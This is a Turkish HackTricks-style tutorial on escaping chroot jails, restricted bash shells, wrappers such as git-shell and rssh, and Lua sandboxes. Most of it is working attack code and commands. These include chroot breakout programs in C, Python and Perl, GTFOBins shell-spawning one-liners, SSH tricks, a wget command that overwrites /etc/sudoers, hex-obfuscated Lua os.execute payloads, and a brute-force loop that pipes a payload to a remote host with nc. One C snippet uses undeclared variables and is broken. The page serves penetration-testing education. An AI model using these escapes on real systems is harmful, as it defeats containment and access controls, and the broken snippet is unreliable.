# Jails'ten Kaçış

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

Eğer "Shell" özelliğine sahip herhangi bir binary çalıştırabiliyorsanız [**https://gtfobins.github.io/**](https://gtfobins.github.io) **adresinde arayın**

## Chroot Kaçışları

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: chroot mekanizması, **ayrıcalıklı** (**root**) **kullanıcılar** tarafından yapılan kasıtlı kurcalamalara karşı **koruma amacıyla tasarlanmamıştır**. Çoğu sistemde chroot context'leri düzgün şekilde üst üste binmez ve yeterli ayrıcalıklara sahip chrooted programlar **dışarı çıkmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, kaçış için chroot içinde root olmanız gerektiği anlamına gelir.

> [!TIP]
> [**chw00t**](https://github.com/earthquake/chw00t) **tool**'u, aşağıdaki escenario'ları kötüye kullanmak ve `chroot`'tan kaçmak için oluşturuldu.

### Root + CWD

> [!WARNING]
> Bir chroot içinde **root** iseniz, başka bir chroot oluşturarak **kaçabilirsiniz**. Bunun nedeni, 2 chroot'un (Linux'ta) bir arada bulunamamasıdır; bu yüzden bir klasör oluşturup ardından bu yeni klasör üzerinde, siz onun **dışındayken**, **yeni bir chroot** oluşturursanız, artık **yeni chroot'un dışında** olursunuz ve dolayısıyla FS içinde olursunuz.
>
> Bu, genellikle chroot'un çalışma dizininizi belirtilen yere taşımamasından kaynaklanır; bu yüzden siz dışındayken bir chroot oluşturabilirsiniz.

Genellikle chroot jail içinde `chroot` binary'sini bulamazsınız, ancak bir binary'yi **compile, upload and execute** edebilirsiniz:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Bu, önceki duruma benzer, ancak bu durumda **saldırgan geçerli dizine bir file descriptor kaydeder** ve ardından **chroot'u yeni bir klasörde oluşturur**. Son olarak, **chroot dışında** o **FD**'ye **erişimi** olduğundan, ona erişir ve **kaçar**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD Unix Domain Sockets üzerinden aktarılabilir, bu yüzden:
>
> - Bir child process oluştur (fork)
> - Parent ve child'ın konuşabilmesi için UDS oluştur
> - Child process içinde farklı bir klasörde chroot çalıştır
> - Parent proc içinde, yeni child proc chroot'unun dışında kalan bir klasörün FD'sini oluştur
> - Bu FD'yi UDS kullanarak child procc'a aktar
> - Child process o FD'ye chdir yapar ve bu, kendi chroot'unun dışında olduğu için jail'den escape eder

### Root + Mount

> [!WARNING]
>
> - Root device (/) bir dizinin içine, chroot'un içindeki bir klasöre mount etmek
> - O klasöre chroot etmek
>
> Bu Linux'ta mümkündür

### Root + /proc

> [!WARNING]
>
> - procfs'i chroot içindeki bir klasöre mount et (eğer henüz mount edilmemişse)
> - /proc/1/root gibi farklı bir root/cwd girdisi olan bir pid ara
> - O girdiye chroot et

### Root(?) + Fork

> [!WARNING]
>
> - Bir Fork (child proc) oluştur ve FS içinde daha derin farklı bir klasöre chroot edip orada CD yap
> - Parent process'ten, child process'in içinde olduğu klasörü çocukların chroot'undan önceki bir klasöre taşı
> - Bu child process kendini chroot'un dışında bulacaktır

### ptrace

> [!WARNING]
>
> - Bir zamanlar kullanıcılar kendi proseslerini yine kendi proseslerinden debug edebiliyordu... ama bu artık varsayılan olarak mümkün değil
> - Yine de, eğer mümkünse, bir prosese ptrace yapıp onun içinde bir shellcode çalıştırabilirsin ([bu örneğe bak](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Jail hakkında bilgi al:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH’i Değiştir

PATH env variable’ını değiştirebiliyor musun diye kontrol et
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim kullanarak
```bash
:set shell=/bin/sh
:shell
```
### Pager'lar ve yardım görüntüleyicileri

Birçok kısıtlı ortam hâlâ **pager**'ları veya **help viewers**'ı kullanılabilir bırakır. Bunlar genelde `PATH`'i yeniden oluşturmaya çalışmaktan daha hızlı suistimal edilir.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Eğer `git` kullanılabiliyorsa, yardım çıktısının genellikle bir pager üzerinden geçtiğini unutmayın:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Yaygın GTFOBins tek satırlıkları

Hangi binary'lere erişilebildiğini öğrendikten sonra, önce bariz shell spawner'ları test edin:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Eğer sadece izin verilen bir komuta **arguments enjekte** edebiliyorsanız (onu serbestçe çalıştırmak yerine), **GTFOArgs**’ı da kontrol edin.

### Script oluştur

İçeriği _/bin/bash_ olan çalıştırılabilir bir dosya oluşturup oluşturamadığınızı kontrol edin
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH üzerinden bash alın

Eğer ssh ile erişiyorsanız, çoğu zaman sunucudan kısıtlı giriş shell’i yerine **farklı bir program** çalıştırmasını isteyebilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Eğer `ssh` yerel olarak izin verilen birkaç binary’den biriyse, bunun aynı zamanda bir **GTFOBin** olarak da kötüye kullanılabileceğini unutmayın:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasının üzerine yazabilirsiniz
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Bazı ortamlarda sizi düz `rbash` içine değil, `git-shell`, `rssh` veya `lshell` gibi **wrappers** içine bırakırlar:

- `git-shell` yalnızca server-side Git commands ve `~/git-shell-commands/` içindeki şeyleri kabul eder. Eğer bu dizin varsa, izin verilen custom actions'ları listelemek için `help` çalıştırın. Oraya **write** yapabiliyorsanız, bu dizine bırakılan herhangi bir executable erişilebilir olur.
- `rssh` / `lshell` genellikle yalnızca `scp`, `sftp`, `rsync` veya Git-style operations'a izin verir. Bu durumlarda önce **file write primitives** üzerine odaklanın: `authorized_keys`, bir shell startup file veya bir helper script'i writable bir konuma upload edin ve ardından `ssh -t ...` ile yeniden bağlanın.
- Eğer wrapper yalnızca command line'ı filtreliyorsa, erişilebilen binaries'leri enumerate edin ve ardından **GTFOBins / GTFOArgs**'a geri dönün.

### Diğer taktikler

Ayrıca şunlara da bakın:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Şu sayfa da ilginç olabilir:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Aşağıdaki sayfada python jails'ten kaçış hakkında taktikler var:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Bu sayfada lua içinde erişiminiz olan global functions'ları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir library’nin fonksiyonlarını **dot kullanmadan çağırmak** için bazı tricks:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Bir library'nin fonksiyonlarını enumerate et:
```bash
for k,v in pairs(string) do print(k,v) end
```
Not: Önceki tek satırlık komutu **farklı bir lua environment** içinde her çalıştırdığınızda **fonksiyonların sırası değişir**. Bu nedenle belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua environments yükleyerek ve le library’nin ilk fonksiyonunu çağırarak bir brute force attack gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua shell al**: Eğer kısıtlı bir lua shell içindeyseniz, şu komutu çağırarak yeni bir lua shell (ve umarım sınırsız) elde edebilirsiniz:
```bash
debug.debug()
```
## Referanslar

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
